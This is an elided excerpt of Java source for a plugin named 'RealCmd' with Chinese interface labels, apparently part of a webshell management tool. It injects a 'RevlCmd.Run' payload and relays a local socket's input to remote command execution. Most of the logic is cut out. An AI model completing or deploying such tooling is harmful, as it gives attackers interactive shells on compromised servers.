...
public class RealCmd implements Plugin {
    ...
    private final JLabel hostLabel = new JLabel("绑定本地Host :");
    private final JLabel portLabel = new JLabel("绑定本地Port :");
    private final JLabel pollingSleepLabel = new JLabel("延迟(ms)");
    private final JLabel execFileLabel = new JLabel("可执行文件路径");
    ...
    private void load() {
        if (!this.loadState) {
            try {
                ...
                inputStream.close();
                if (this.payload.include("RevlCmd.Run", data)) {
                    this.loadState = true;
    ...
    class runCmd {
        ...
        public runCmd(Socket socket, Payload payload, String execFile, JTextField pollingSleepTextField) {
            try {
                ...
                byte[] result = payload.evalFunc("RevlCmd.Run", "xxx", reqParameter);
        ...
        public void IO(InputStream inputStream) {
            ...
            try {
                while ((readNum = inputStream.read(data)) != -1 && !this.socketx.isClosed()) {
                    ...
                    byte[] result = RealCmd.this.payload.evalFunc("RevlCmd.Run", "xxx", reqParameter);
